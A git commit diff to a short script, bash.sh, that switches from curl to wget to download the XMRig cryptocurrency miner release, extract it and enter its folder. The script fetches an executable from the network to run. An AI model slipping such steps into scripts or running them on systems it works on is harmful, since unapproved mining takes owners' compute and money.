30d7f39c6ec404c23185eb91cc08e651925d4494
1234 <91278669+sleaglelk@users.noreply.github.com>
2021-10-16 15:13:16 +0530

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,4 +1,4 @@
-curl -O https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
 cd xmrig-6.15.0
